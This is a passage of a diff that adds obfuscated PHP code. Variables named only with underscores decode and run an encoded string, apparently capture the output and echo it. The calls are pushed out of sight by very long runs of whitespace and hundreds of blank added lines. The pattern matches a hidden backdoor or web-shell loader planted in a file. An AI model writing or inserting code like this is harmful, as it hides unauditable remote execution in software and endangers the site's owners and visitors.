+HfyKjr6o8148hU9e+//S80906N';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
